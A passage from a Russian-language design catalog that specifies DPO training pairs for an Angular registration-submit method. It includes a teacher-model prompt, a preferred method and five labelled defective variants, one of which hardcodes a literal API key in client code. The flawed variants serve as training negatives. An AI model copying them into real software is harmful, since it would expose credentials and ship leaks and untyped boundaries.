  `ng_untyped_any_boundary`), КАЖДЫЙ с названным родительским классом `PromptError-02 No DNA
  Safety` (критический, `RAG-10` §6.3 — single-owner имён), **плюс канонические `RAG-07`
  rubric-имена** (`secretPresenceArbiter`, `idempotentCreateArbiter`) как **ОСЬ СКОРЕРА, а НЕ
  код негатива** (то же переякоривание, что PE-4: `PromptError`-каноника — РОДИТЕЛЬ, `RAG-07`
  рубрики — ось скорера; single-owner FC-44, переименовывать канонические имена ЗАПРЕЩЕНО).
  React-специфичные строки `REACT-ADVANCED` в Angular-домен verbatim НЕ переносятся (строжайшая
  трактовка лицензии, PE-5.4).
- **(б) Overlap-гейт — доменный CODE-OVERLAP PE-4.4 ПЕРЕформулирован под Angular:** «рамка»
  (`frame`) = контракт класса компонента + template-shell + сервис-контракт; юнит живёт в ДВУХ
  текстах (`.ts` + `.html`) — правило в PE-5.4.
- **(в) LegScope = `PersonalAdaptive` (НЕ common-кандидат сервера PE-4):** `RAG-02` mapping
  **Paid=Angular** — клиентский Angular = ПЛАТНЫЙ tier доменного сплита, строки НЕ смеют кормить
  free-common ногу (обоснование в PE-5.4).
- **(г) `DpoTrainReady=false` (как PE-2/PE-3/PE-4, согласовано с §1.1/§4 п.6):** отличие от
  образца-Fable (тот ставил `true`) — наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ
  задач, иначе `dual-live-canon` статуса готовности; с ЧЕСТНЫМ клиентским split (PE-5.4).

### Задача 4 — Клиентский код (Angular xiigen-flows `flows/FLOW-NN-*/client/angular/`)

#### PE-5.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: задача 4 — пользователь расширения VS/VS Code просит «улучши этот
Angular-компонент/сервис» (или «подключи экран к API»); конвейер стадий 43 маршрутизирует
запрос к обучаемому client-code юниту, который обязан выдавать код В КЛИЕНТСКОЙ DNA-РАМКЕ
платформы XIIGen (тонкий компонент, типизированная API-граница, управляемые подписки), а не
«просто работающий TypeScript». Владелец-домен (карта §3 строка 4) — Angular-сторона
`xiigen-flows`: `flows/FLOW-NN-*/client/angular/`. Структура подтверждена ЖИВЫМ counted
spot-read этим пассом (как PE-4 читал реальные `.cs`, здесь читались реальные `.ts`/`.html`).

**Counted spot-read факты живого корпуса (grep этим пассом, ПОСЧИТАНО, не оценки — гейт
claim-verification «посчитанные тоталы»):**
1. **47 standalone-клиентов Angular** в `xiigen-flows/flows/FLOW-NN-*/client/angular/`
   (counted: `188` non-spec `.ts` = РОВНО `47×{main.ts, app.ts, app.routes.ts, app.config.ts}` —
   default-shell на каждый флоу; `47` `.spec.ts`; `235` `.ts` всего). Образец-Fable оценивал
   «47×5≈235» — это была ОЦЕНКА; ПОСЧИТАННЫЙ факт: `188` non-spec + `47` spec = `235`.
2. **0 feature-компонентов, 0 сервисов** (counted: `0` файлов `*.component.ts`, `0` файлов
   `*.service.ts`) — вся логика каждого флоу в ЕДИНСТВЕННОМ корневом классе `App` (`app.ts`),
   отдельного слоя компонентов/сервисов НЕТ.
3. **API-wiring слой ОТСУТСТВУЕТ в живом корпусе** (counted grep по всем 47 клиентам):
   `0` хитов `HttpClient`, `0` импортов `@angular/common/http`, `0` импортов `rxjs`, `0`
   `.subscribe(`, `0` `provideHttpClient`/`HttpClientModule`, `0` `takeUntilDestroyed`/`DestroyRef`.
   `47` файлов используют `signal()`. То есть живые клиенты сегодня — СТАТИЧЕСКИЕ signal-демо.

**Клиентская DNA-рамка (по реализации, живой VERIFIED spot-read FLOW-01 целиком + FLOW-08 голова):**
1. **standalone signal-компоненты** — `@Component({ selector, imports: [CommonModule, FormsModule],
   templateUrl, styleUrl })` без `NgModule` (`FLOW-01 app.ts:21–:26`); состояние — `signal<T>()` /
   `computed()` (`app.ts:29–:36, :53–:55`);
2. **новый control flow** `@if`/`@for` + `[ngModel]`-на-сигнале с `(ngModelChange)`
   (`FLOW-01 app.html:17, :31, :51, :55, :70`);
3. **тестируемость и a11y** — `data-testid`-атрибуты под Playwright (`app.html:57`), статусные
   сообщения через `role="status"` (`app.html:40`);
4. **двуязычие EN/HE + RTL** — ивритские строки прямо в шаблоне (`app.html:8, :47, :58,…`),
   `dir=rtl` через `applyLanguage` (`app.ts:121–:125`), `hebrewLabel` (`app.ts:142–:152`);
5. **зонтик ошибок** — `provideBrowserGlobalErrorListeners()` (`app.config.ts:8`); router
   (`app.config.ts:9`); один route на `App` (`app.routes.ts:4–:8`);
6. **тонкий клиент (R6-аналог DNA)** — вся доменная логика на сервере (`Xiigen.Flow.*.Application`,
   PE-4), клиент = представление + вызовы API; llm_mvp_core-родство: R6 SIMPLE AGENT BOUNDARY
   («set of API calls… no internal algorithm logic in the agent layer», `CLAUDE.md`).

**Критическая честная нота корпуса (split-honesty):** «форма компонента» (signals/standalone/
control-flow/RTL/a11y) — **ЖИВАЯ уже сейчас** (VERIFIED spot-read). «API-wiring» (типизированный
сервис + подписки + HTTP) — **ФОРВАРД-паттерн (`SYNTHETIC_SEED`)**, потому что в живом корпусе
его нет (counted: `0` HttpClient/subscribe по всем 47). Форвард обоснован серверным API того же
FLOW-01 (PE-4-якорь `UserRegistrationService`/`EmailVerificationService`) и wiki-evidence
`RAG-02` :468 («Client integration: Angular app should call backend job endpoints»). Пример
прохода строит именно этот форвард-слайс и честно его маркирует (PE-5.4/PE-5.5).

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **`Level="unit"`** (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — единица = ОДИН короткий
  метод компонента в жёсткой клиентской рамке, НЕ node/edge-план.
- **`NodeOrEdgeId="client-code/xiigen-flows/flow01-registration-submit"`** — паттерн карты §3
  строка 4 (`client-code/<репо>/<слайс>`).
- **LegScope: `PersonalAdaptive` (paid-домен Angular) — переобоснование против common-кандидата
  сервера PE-4:** `RAG-02` **Paid=Angular** (:18/:38/:142/:933, VERIFIED живым grep этим пассом) —
  Angular = платный tier сплита (`LicenseManager.CheckDomain`+`DomainLoader`+CDN signed URL,
  приватный репо `xiigen_smart_domains`); примеры этого прохода = кандидаты ПЛАТНОЙ Angular-ноги,
  НЕ free-common. Полное обоснование границы (продуктовая, не privacy) — в PE-5.4.
- Честные ноты домена: (а) обучаемого client-code юнита в коде НЕТ — адресация целится в
  unit-level будущего DPO-build; маршрут `TrainBatchAsync`→узел — **[условно от M1/M2]**;
  (б) незарегистрированный адрес → честный `NODE_TRAINER_NOT_REGISTERED` + карантин-очередь;
  (в) AngularJS — намеренно ОТДЕЛЬНЫЙ домен (`RAG-02` :860/:932, VERIFIED: «чтобы модель не
  отвечала на AngularJS языком Angular 2+») — AngularJS-строки в Angular-пары НЕ смешиваются.

**Поправка карты по живому spot-read (observation, evidence-only — §3 НЕ правится, кандидат
свипа PE-10):** живой Angular существует ТОЛЬКО в `xiigen-flows` (47 клиентов); `xiigen-platform`
Angular-клиента не несёт (чистый .NET); `xiigen mvp`-клиент = React 18 — §3 строка 4 уже
честно несёт эту ноту (карта §3 нота «в»), выравнивание — кандидат свипа PE-10, не блокер PE-5.

#### PE-5.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (реальный якорь — живой `submitRegistration()` FLOW-01 `app.ts:98–:101` + живая кнопка
`data-testid="submit-registration"` (click)="submitRegistration()" `app.html:57`): подключить
submit регистрации к серверному API через типизированный клиентский сервис. `Y_best` —
правдоподобный «работающий» черновик, который вызывает API прямо из компонента; `Y_goal` — тот
же метод в полной клиентской рамке (тонкий компонент + типизированная граница + управляемая
подписка + идемпотентный submit). Живой `submitRegistration()` сегодня просто переключает
сигналы БЕЗ API-вызова (`app.ts:98–:101`, VERIFIED) — форвард к API = `SYNTHETIC_SEED`.

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON (учитель
Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ репозиторий):**

```json
{
  "task": "Улучшить этот метод Angular-компонента (submit регистрации, standalone signal-компонент Angular 21). Улучшай МЕТОД в клиентской DNA-рамке платформы XIIGen (тонкий компонент: транспорт только через типизированный инжектированный сервис; управляемая подписка; типизированная API-граница; идемпотентный submit; состояние через signals) — не меняй сигнатуру метода, селектор компонента и сервис-контракт; не решай задач за пределами метода.",
  "target_unit": "client-code/xiigen-flows/flow01-registration-submit",
  "input_context": "компонент-рамка (standalone, Angular 21, signal-based): class App { readonly email = signal('new.member@example.com'); readonly password = signal('local-demo-password'); readonly journeyState = signal<JourneyState>('registration'); readonly message = signal<string | null>(null); readonly submitting = signal(false); private readonly registrationApi = inject(RegistrationApi); private readonly destroyRef = inject(DestroyRef); }; template-shell (живой паттерн app.html): <button type=\"button\" class=\"primary\" data-testid=\"submit-registration\" (click)=\"submitRegistration()\"> + @if (message()) { <section class=\"notice\" role=\"status\" data-testid=\"status-message\">{{ message() }}</section> }; сервис-контракт (клиентская API-граница — владелец транспорта/base-URL/заголовков): RegistrationApi.register(request: RegistrationRequest, options?: { headers?: Record<string, string> }): Observable<RegistrationAccepted>; interface RegistrationRequest { email: string; password: string; clientRequestId: string }; interface RegistrationAccepted { registrationId: string; statusMessage: string }",
  "current_best_output": "<Y_best-метод — черновик, развёрнут в блоке ниже; в транспорте — JSON-escaped строка>",
  "requirements": [
    "compile-shape: валидный TypeScript/Angular; сигнатура submitRegistration(): void, селектор и сервис-контракт не менять (I/O-инвариант)",
    "тонкий компонент (R6-аналог DNA): транспорт ТОЛЬКО через инжектированный типизированный RegistrationApi; HttpClient/URL/заголовки в компоненте запрещены — ось скорера thin-component-контракт",
    "управляемая подписка: каждый manual .subscribe несёт takeUntilDestroyed(this.destroyRef); неуправляемая подписка запрещена — ось скорера subscription-management",
    "типизированная API-граница: DTO-типы RegistrationRequest/RegistrationAccepted; any на границе запрещён — ось скорера typed-boundary",
    "идемпотентный submit: in-flight guard по submitting() + client-generated clientRequestId (клиентская половина idempotentCreate, AIP-133) — ось скорера idempotentCreateArbiter (RAG-07)",
    "signal-first состояние: мутации только через signal.set/update; error-ветка обязана вернуть пользователю читаемое сообщение через message(); бизнес-логика в template запрещена (живой канон 47 клиентов — signals; классическая OnPush+async-pipe — легальная альтернатива той же оси)",
    "никаких литеральных секретов/ключей/токенов в клиентском коде — ось скорера secretPresenceArbiter (CWE-798, RAG-07)"
  ],
  "wrong_markers": [
    "ng_unmanaged_subscription_leak", "ng_http_in_component_service_bypass", "ng_untyped_any_boundary",
    "secretPresenceArbiter", "idempotentCreateArbiter"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный метод компонента (Y_goal); один метод, не файл и не проект",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**`Y_best` (current_best_output, развёрнуто; правдоподобный черновик наивного генератора —
«работает», но нарушает пол-DNA клиентской рамки, как `Y_best` PE-4 без verification-фазы — это
НЕ инъекции негативов):**

```typescript
submitRegistration(): void {
  this.http.post<any>('http://localhost:5001/api/registrations', {
    email: this.email(),
    password: this.password()
  }).subscribe(result => {
    this.journeyState.set('pending');
    this.message.set(result.message);
  });
}
```

Слабости `Y_best` (то, что учитель должен улучшить): транспорт прямо в компоненте (`this.http` +
захардкоженный абсолютный URL — сервис обойдён); `post<any>` — граница нетипизирована
(`result.message` может не существовать); подписка без teardown; нет error-ветки (упавший запрос
= молчание пользователю); нет in-flight guard и `clientRequestId` (двойной клик = два POST); нет
сброса состояния при ошибке.

Бюджет (plan-09 :499; plan-08 §3.5.2 :814, `num_ctx≈8192`): `max_input_tokens = num_ctx −
reserved_output_tokens`. Аппроксимация автора: task+criteria ≈ 750 ток.; input_context ≈ 850;
current_best_output ≈ 300; format ≈ 350; резерв ответа 1024 — итого ≈ 3300 ≪ 8192: unit-level
(ОДИН метод компонента, не «весь клиент»), влезает без порезки (`trimmed=false`; фактический
токен-счёт меряет токенайзер при build, каталог его НЕ заявляет).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = `Y_goal`; один метод в полной клиентской
рамке — форма живого signal-паттерна `app.ts:98–:101` + форвард API-wiring по сервис-контракту;
API-wiring слой = `SYNTHETIC_SEED`, форма signal-мутаций = живая):**

```typescript
submitRegistration(): void {
  if (this.submitting()) {
    return; // идемпотентный submit: повторный клик/Enter не создаёт второй POST
  }
  this.submitting.set(true);
  const request: RegistrationRequest = {
    email: this.email(),
    password: this.password(),
    clientRequestId: crypto.randomUUID()
  };
  this.registrationApi.register(request)
    .pipe(takeUntilDestroyed(this.destroyRef))
    .subscribe({
      next: (accepted: RegistrationAccepted) => {
        this.journeyState.set('pending');
        this.message.set(accepted.statusMessage);
        this.submitting.set(false);
      },
      error: () => {
        this.message.set('Registration could not be submitted. Please try again.');
        this.submitting.set(false);
      }
    });
}
```

```json
{
  "improvements": [
    "тонкий компонент: транспорт перенесён в инжектированный типизированный RegistrationApi (base-URL/заголовки/HTTP — собственность сервиса, не компонента)",
    "управляемая подписка: takeUntilDestroyed(this.destroyRef) — подписка не переживает уничтожение компонента",
    "типизированная граница: RegistrationRequest/RegistrationAccepted вместо any — опечатка поля ловится компилятором",
    "идемпотентный submit: in-flight guard по submitting() + client-generated clientRequestId (клиентская половина idempotentCreate)",
    "error-ветка: упавший запрос возвращает пользователю читаемое статусное сообщение через message() (role=status в template-shell), submitting сбрасывается в ОБЕИХ ветках",
    "signal-first: все мутации состояния через signal.set — живой канон 47 клиентов"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (client-code ось — карта §3 строка 4:
«форма-валидность компонента/сервиса, контракты API-границы, quality-gate рубрики»;
детерминированный eval-only судья; пороги/веса — per-WO деталь, WO может только УЖЕСТОЧИТЬ):**
1. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax);
2. **compile-shape:** `goal_text` парсится как валидный TypeScript/Angular-метод (`tsc`-парс +
   Angular template type-check — концептуальный аналог Roslyn-чека PE-4; runtime-чекера НЕТ —
   **[условно от M1]**); сигнатура == контракту из `input_context` (I/O-инвариант);
3. **thin-component-контракт (R6-аналог DNA):** структурный детектор транспорта в компоненте —
   `HttpClient`-токен / `http.`-вызов / литеральный URL в теле метода (провал = класс
   `ng_http_in_component_service_bypass`);
4. **subscription-management-контракт:** каждый manual `.subscribe(` несёт
   `takeUntilDestroyed`/`DestroyRef`-teardown (провал = класс `ng_unmanaged_subscription_leak`);
5. **typed-boundary-контракт:** `any` / нетипизированный ответ на API-границе (провал = класс
   `ng_untyped_any_boundary`);
6. **rubric-чеки `RAG-07` (framework-agnostic Tier-1 сабсет — ОСИ, не коды негативов):**
   `secretPresenceArbiter` — литеральные креды/ключи/токены в клиентском коде запрещены, «репо
   приватное» не оправдание (REJECT-сигнал рубрики `RAG-07` :457; CWE-798, :287); `idempotentCreate`
   (клиентская половина) — create-класс submit несёт in-flight guard + client-generated key
   (ACCEPT-правило «key от клиента» `RAG-07` :477, AIP-133);
7. **signal-first/template-чеки:** мутации состояния через `signal.set/update`; в template —
   только презентационные binding'и/`@if`/`@for`; статусные сообщения через `role="status"`
   (живой a11y-паттерн `app.html:40`); бизнес-логика в template — объявленный доменный класс
   `ng_logic_in_template` (в ЭТОЙ паре НЕ инстанцирован — честно записано, не «пройден»).

Решение гейта (наш `ChosenSelectionRule`, plan-09 :497–:498): `Y_goal := argmax_k Score(g_k)`
(best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT); `chosen = Y_goal ⇔ Score(Y_goal) >
Score(Y_best)`, ничья/НЕТ → `chosen = Y_best` (лучший кандидат УЧЕНИКА). Судейские скоры
(compile-shape/структурные детекторы рамки/rubric-чеки) — `preference_score`/Y_best-аудит, они НЕ
авторствуют `chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Непобедившие
генерации учителя `g_k` (k≠argmax) — eval-only.

**(г) STUDENT-проекция (типизированный unit-I/O обучаемой стороны):** client-code юнит:
`InputContext{component_contract, template_shell, service_contract, y_best_method}` → улучшенный
метод (текст). В паре: `InputContext` = рамка+shell+контракт+черновик (БЕЗ сырого промпта
пользователя — анти-replay), `Chosen` = принятый метод, `Rejected` = дефектный вариант.
Достижимость студентом (≤3–4B / узкая специализация): единица — ОДИН короткий метод в ЖЁСТКОЙ
клиентской рамке с конечным словарём паттернов (guard-клауза, `inject`, `takeUntilDestroyed`,
типизированный DTO, error-ветка, `signal.set`) — структурный выход, не свободное эссе. До
обучения client-code ноги студент честно отдаёт not_ready — путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD`.
Всё **[условно от M1/M2]**.

#### PE-5.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошим методом (б): полный компилируемый правдоподобный
метод (НЕ отказ, НЕ мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды — 3
ЯВНЫХ доменно-локальных Angular-кода `ng_*`, КАЖДЫЙ с названным родителем `PromptError-02 No DNA
Safety` (критический, `RAG-10` §6.3: клиентская DNA-рамка = та же ось «безопасность рамки», что
серверная у PE-4) + 2 канонических `RAG-07` rubric-имени (framework-agnostic Tier-1, seed-строки
`EXT-SEC-005`/`EXT-ARCH-006`) как ОСЬ СКОРЕРА. `RAG-07`-рубрики стоят как ось скорера, НЕ как код
негатива (single-owner FC-44). Аннотация строго `[WRONG: код — описание — последствие]`, ровно
одна главная ошибка.

**N1 — критический (клиентская рамка: подписки; ось 4 скорера).** Из pipe удалён teardown:
`this.registrationApi.register(request).subscribe({ next: (accepted: RegistrationAccepted) => {…}, error: () => {…} });` (строка `.pipe(takeUntilDestroyed(this.destroyRef))` отсутствует; всё остальное без изменений)
`[WRONG: ng_unmanaged_subscription_leak (доменно-локальный; родитель PromptError-02 No DNA Safety, критический; ось скорера subscription-management) — manual-подписка без takeUntilDestroyed/DestroyRef-teardown: подписка переживает уничтожение компонента; поздний ответ API мутирует сигналы мёртвого компонента (stale-write), а повторные create/destroy экрана накапливают живые подписки — классическая клиентская утечка памяти]`

**N2 — критический (клиентская рамка: R6-аналог thin-boundary; ось 3 скорера).** Вызов сервиса
заменён прямым транспортом в компоненте (+ `private readonly http = inject(HttpClient);` в рамке):
`this.http.post<RegistrationAccepted>('http://localhost:5001/api/registrations', request).pipe(takeUntilDestroyed(this.destroyRef)).subscribe({ next: (accepted) => {…}, error: () => {…} });`
`[WRONG: ng_http_in_component_service_bypass (доменно-локальный; родитель PromptError-02 No DNA Safety) — компонент сам владеет HTTP/URL вместо инжектированного типизированного RegistrationApi: клиентский аналог dna_concrete_dependency_bypass PE-4 и нарушение R6-аналога (логика транспорта утекла в слой представления); base-URL/заголовки/retry-политика дублируются по компонентам, компонент нетестируем без реального HTTP, границу API нельзя централизованно версионировать/защищать]`

**N3 — типизация границы (ось 5 скорера).** Типизированный DTO заменён `any`:
`.subscribe({ next: (accepted: any) => { this.journeyState.set('pending'); this.message.set(accepted.statusMesage); this.submitting.set(false); }, error: () => {…} })`
`[WRONG: ng_untyped_any_boundary (доменно-локальный; родитель PromptError-02 No DNA Safety) — API-граница потеряла типизированный контракт: опечатка statusMesage КОМПИЛИРУЕТСЯ и молча отдаёт undefined в role=status сообщение пользователю; контрактные изменения сервера перестают ловиться компилятором — ошибка всплывает только в рантайме у пользователя]`

**N4 — критический (канонический `RAG-07` rubric `secretPresenceArbiter`; ось 6 скорера).** В
вызов сервиса добавлен литеральный ключ:
`this.registrationApi.register(request, { headers: { 'X-Xiigen-Api-Key': 'xiigen_pk_live_7f3ab9c2d41e' } })` (всё остальное без изменений)
`[WRONG: secretPresenceArbiter (канонический RAG-07 Tier-1; seed EXT-SEC-005, источники NIST-SSDF/CWE-TOP25, CWE-798, RAG-07 :457/:287) — литеральный API-ключ в клиентском коде: REJECT-сигнал рубрики «любой литерал креда; репо приватное — не оправдание»; клиентский бандл публичен by construction — ключ уезжает в браузер КАЖДОГО посетителя и извлекается из DevTools/сборки; секреты живут только на сервере/в env, клиент получает только сессионные краткоживущие токены]`

**N5 — канонический `RAG-07` rubric `idempotentCreateArbiter` (клиентская половина; ось 6
скорера).** Удалён in-flight guard:
`submitRegistration(): void { this.submitting.set(true); const request: RegistrationRequest = { …, clientRequestId: crypto.randomUUID() }; this.registrationApi.register(request).pipe(takeUntilDestroyed(this.destroyRef)).subscribe({…}); }` (блок `if (this.submitting()) { return; }` отсутствует; всё остальное без изменений)
`[WRONG: idempotentCreateArbiter (канонический RAG-07 Tier-1; seed EXT-ARCH-006, источник рубрики GOOGLE-AIP AIP-133, RAG-07 :477/:293) — create-submit без in-flight подавления: двойной клик/повторный Enter = два вызова submitRegistration(), каждый минтит СВЕЖИЙ clientRequestId → два разных ключа → сервер видит две легальные регистрации (REJECT-класс «каждый POST = новая запись» с клиентской стороны); клиентская половина ACCEPT-правила «key от клиента + подавление дублей попытки» разрушена, серверная дедупликация PE-4 N5 обойдена парой свежих ключей]`

**Маппинг на канон (честная нота именования, single-owner FC-44):** N1–N3 несут ЯВНЫЕ
доменно-локальные Angular-коды `ng_*`, потому что среди канонических `PromptError-01..12` НЕТ
кодов для конкретных клиентских DNA-нарушений (leak/inline-HTTP/any); каждый называет родителя
`PromptError-02 No DNA Safety` (критический) — «не сваливать в один PromptError-02» соблюдено (три
разных явных кода). N4/N5 несут КАНОНИЧЕСКИЕ `RAG-07` rubric-имена (`secretPresence`,
`idempotentCreate` — framework-agnostic Tier-1), стоящие как ОСЬ СКОРЕРА, не как код негатива —
переименовывать канонические имена (ни `PromptError`, ни `RAG-07`) ЗАПРЕЩЕНО (no dual-canon).
Гейты пары: G1 (каждый N — компилируемый правдоподобный метод, типичный улов клиентского
код-ревью: leak/inline-HTTP/any/hardcoded-key/double-submit, не отказ и не мусор); G2/G3 (код +
`[WRONG:]` присутствуют); G5 (не почти-копия по дифф-региону — клиентский гейт PE-5.4); G6 (классы
типичны: подписки/тонкий компонент/типизация — ровно то, что клиентская рамка существует чтобы
запрещать; secretPresence/idempotentCreate — Tier-1 ядро 23 quality-gates `RAG-07`). Каждый N —
ровно одна главная ошибка; слабый негатив (например, отличие только в имени переменной) →
отбраковка предохранителем (`PromptError-08 Poor Negative Examples` / `ORCH-10 Low Signal
Negative`, §1.3 п.6), НЕ обучение. Объявленные, но НЕ инстанцированные доменные классы (честная
нота): `ng_logic_in_template` (бизнес-логика в шаблоне), `ng_effect_for_derived_state` (`effect()`
там, где нужен `computed()` — ось экзаменаций `RAG-07` :224) — кандидаты будущего DPO-build,
полный баланс классов = его обязанность, не каталога.

#### PE-5.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "client-code-pair-0001",
  "Level": "unit",
  "NodeOrEdgeId": "client-code/xiigen-flows/flow01-registration-submit",
  "InputContext": { "component_contract": "standalone signal-компонент Angular 21: сигналы email/password/journeyState/message/submitting; inject(RegistrationApi); inject(DestroyRef)",
                    "template_shell": "<button data-testid=\"submit-registration\" (click)=\"submitRegistration()\"> + @if (message()) { <section role=\"status\" data-testid=\"status-message\"> }",
                    "service_contract": "RegistrationApi.register(request: RegistrationRequest, options?): Observable<RegistrationAccepted>; RegistrationRequest{email,password,clientRequestId}; RegistrationAccepted{registrationId,statusMessage}",
                    "y_best_method": "<черновик Y_best из PE-5.2>" },
  "Chosen":   { "method_text": "<метод (б): guard + типизированный запрос + сервис + takeUntilDestroyed + error-ветка + signal-мутации>" },
  "Rejected": { "method_text": "<N1: manual-подписка без teardown>" },
  "WrongMarkers": ["[WRONG: ng_unmanaged_subscription_leak — подписка переживает компонент, поздний ответ мутирует мёртвое состояние — клиентская утечка памяти]"],
  "Reason": "Manual-подписка клиентского компонента обязана быть управляемой (takeUntilDestroyed/DestroyRef): клиентская DNA-рамка платформы — тонкий компонент с детерминированным жизненным циклом; неуправляемая подписка — критический дефект клиентской DNA-оси",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["xiigen-flows-flow01-angular-client-spotread", "catalog-pe5-client-code-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **Поле 14 `DpoTrainReady` = `false` (согласовано с PE-2/PE-3/PE-4, §1.1, §4 п.6), с ЧЕСТНЫМ
  клиентским split.** Доменного Phase-0-блока (как `TOKENIZER_BLOCKED` у HE_EN) в код-части НЕТ:
  TypeScript/HTML/латиница токенайзер не блокирует (ивритские template-строки — та же BPE-кавета,
  что у PE-3, но они НЕ несущая часть КОД-пары). НО — клиентская СПЕЦИФИЧЕСКАЯ корпусная кавета
  (counted spot-read): семья строк **«форма компонента»** (signals/standalone/control-flow/RTL/
  a11y) — ЖИВАЯ уже сейчас; семья строк **«API-wiring»** (подписки/сервисы/HTTP) — до реального
  подключения клиентов к API строится ТОЛЬКО как `SYNTHETIC_SEED` от сервис-контракта + `RAG-02`
  :468 (counted: `0` HttpClient/subscribe/`takeUntilDestroyed` по всем 47 клиентам). `false` держат
  глобальные предусловия (как у PE-4): (1) до `G-DPO-FINAL` (overlay :48–:53) любой teacher-выход
  этапа `TP1_LOCAL` — eval/quarantine, никакого `TrainBatchAsync`; (2) builder/scorer/`tsc`-
  compile-shape-чекер/маршрут в коде НЕ существуют — **[условно от M1]**; (3) до импорта `RAG-07`
  rubric-СТРОК нужна `ARBITER-VOCABULARY`-нормализация (`RAG-07` :1187 — 2004 различных имени →
  канонические гейты; точный Tier-1 shortlist = кандидат PE-10), а `REACT-ADVANCED` — формат/
  паттерн-референс (React-строки), НЕ Angular-строки. Отличие от образца-Fable (тот ставил `true`):
  наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ задач — иначе `dual-live-canon` статуса
  готовности (FC-44). Всё **[условно от M1 + G-DPO-FINAL]**.
- **Reward-scalarization (ОБЯЗАТЕЛЬНА по trainable-architecture-decision SI_GATE_3 + generated-code-
  review Layer 5B — сторона клиентского кода НЕ атомарный ответ, а строка-СТРУКТУРА → нужен
  именованный `reward(side)`-экстрактор; наш plan-07 :341–:360, VERIFIED живым чтением).**
  `SerializeCandidate(side)=method_text`; далее каноном блока 07: `reward(side)=Beta·(policyLogP(
  method_text | input_context) − referenceLogP(method_text | input_context))`; `margin =
  chosenReward − rejectedReward`. Судейские скоры (compile-shape/структурные детекторы рамки/rubric-
  чеки) → `preference_score`/Y_best-аудит, они НЕ авторствуют `chosen`/`rejected` и НЕ заменяют
  `reward(side)` (plan-07 :355–:357). Сторону без сериализации/скаляризации → `REWARD_EXTRACTOR_MISSING`
  (plan-07 :359–:360). `margin ≤ 0.05` или `overlap ≥` доменный порог → `LOW_CONTRAST`, не учим
  (plan-07 :520).
- **CLIENT-CODE-OVERLAP гейт (доменное решение — рестейт PE-4.4 для Angular; двух-текстовый юнит):**
  одно-дефектная инъекция в ~25-строчный метод даёт raw token-overlap positive↔negative ≫ 0.75 by
  construction (почти весь метод — общая рамка) — правило вычитания рамки переносится из PE-4.4, но
  «рамка» переопределяется по-клиентски: `frame` = токены `InputContext` = **контракт класса
  компонента + template-shell + сервис-контракт + `Y_best`-черновик**; `shared=(chosen∩rejected)−
  frame; total=(chosen∪rejected)−frame; overlap_ratio=shared/total`. Гейт ОДНОСТОРОННИЙ:
  `overlap_ratio > 0.75 → discard` (дифф-регионы сторон почти совпадают → нет контраста), нижней
  границы НЕТ (малый материальный дифф легален — SWE-bench-стиль, `RAG-07` :324); плюс порог
  материальности: изменённый регион ≥ 1 семантический statement, где statement = TS-statement ИЛИ
  template-binding/control-flow-узел; rename/whitespace/comment-only дифф → discard (класс G5).
  **Angular-специфика (двух-текстовый юнит .ts+.html):** юнит живёт в `.ts` + `.html`; template-shell
  считается рамкой ТОЛЬКО пока негатив его не трогает — если дифф негатива лежит в шаблоне (класс
  `ng_logic_in_template`), затронутые template-токены переходят в дифф-регион, не в рамку.
  **Обязательная кавета (concept vs runtime):** `0.75` — КОНЦЕПТУАЛЬНЫЙ порог (перенос PE-4.4);
  runtime-мерителя НЕ существует **[условно от M1]**; калибровка = обязанность DPO-build. N1–N5
  сконструированы одно-дефектными инъекциями с НЕПЕРЕСЕКАЮЩИМИСЯ дифф-регионами (удалённый
  pipe-teardown / inline-HTTP / any-хвост / headers-литерал / удалённый guard) — попарный overlap
  дифф-регионов ≈ 0 by construction; фактический `overlap_ratio` меряет builder, НЕ каталог.
- **Fan-out (winner-vs-each-loser, SI_GATE_4 + generated-code-review Layer 5C):** 5 негативов на
  один `chosen` → 5 ОТДЕЛЬНЫХ пар `client-code-pair-0001..0005` (по одной на N1..N5); поле
  `Rejected` НИКОГДА не несёт список (§1.3 п.10; владелец проекции `producer-output → SourceRow[]`
  — builder WO-M1.1).
- **LegScope: `PersonalAdaptive` (paid-домен Angular) — переобоснование против common-кандидата
  сервера PE-4:** сервер .NET у PE-4 = common-кандидат, потому что Free=.NET — бесплатный tier
  сплита `RAG-02`. Angular — ПЛАТНЫЙ tier того же сплита (`RAG-02` :18/:38/:142/:933, VERIFIED
  живым grep: Paid=Angular/AngularJS/Java/SQL через `LicenseManager.CheckDomain`+`DomainLoader`+CDN,
  приватный репо `xiigen_smart_domains`) — строки client-code НЕ смеют кормить free-common ногу:
  способность платного Angular-домена, попавшая в бесплатную common-модель, раздаёт платный домен
